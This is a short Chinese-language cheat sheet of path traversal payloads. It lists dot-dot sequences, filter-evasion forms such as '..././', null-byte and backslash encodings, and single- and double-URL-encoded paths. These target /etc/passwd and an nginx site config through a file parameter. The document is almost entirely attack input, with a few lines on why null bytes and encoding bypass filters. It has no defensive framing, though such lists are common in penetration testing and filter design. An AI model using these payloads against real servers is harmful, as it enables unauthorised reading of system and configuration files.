## **目录穿越，各种触发格式**
```
../
/../
/static../
/admin/admin.php?file=..././..././..././..././/etc/nginx/sites-enabled/site.conf
/.%00.%2F
/..%5c..%5c

包含 %00，这在文件路径中是不合法的。在大多数操作系统中，
空字符（null byte）用于表示字符串的结束，
如果这个字符串被错误地解释为文件路径，它实际上可能不会形成一个有效的路径。


url编码绕过
.   =>  %2e
/   =>  %2f
% => %25  (双重URL编码)

..%2f..%2f..%2fetc/passwd
..%252f..%252f..%252fetc/passwd  
```

^
